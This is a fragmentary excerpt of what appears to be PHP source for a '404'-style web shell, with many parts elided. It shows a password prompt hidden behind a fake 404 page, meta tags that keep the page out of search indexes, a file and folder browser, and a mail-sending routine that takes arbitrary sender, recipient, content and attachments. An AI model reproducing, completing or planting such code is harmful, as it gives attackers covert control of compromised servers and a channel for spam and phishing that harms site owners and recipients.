...
if(!function_exists('auth')){
        function auth(){
                ...
                var d = document;
                d.write(\"<br><br><center><img src='http://i57.tinypic.com/5n51ls.png' alt='404 Logo'></center></br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");
...
if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){
        ...
        $mailAttachment = (!empty($mailAttachment))? explode("{[|404|]}", $p['mailAttachment']):array();
...
<meta name='robots' content='noindex, nofollow, noarchive'>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
<link rel='SHORTCUT ICON' href='<?php echo get_resource('404');?>'>
<style type="text/css">
@font-face {
...
<div id='wrapper'>
        ...
        <div id='header'>
                ...
                <div id='headerNav'>
                        ...
                        <img onclick='viewfileorfolder();' id='404' src='<?php echo get_resource('404');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
...
function mail_send(){
        ...
        mailAttachment = '';
        if($('.mailAttachment')){
                mailAttachment = $('.mailAttachment').map(function(){ return this.value; }).get().join('{[|404|]}');
        }
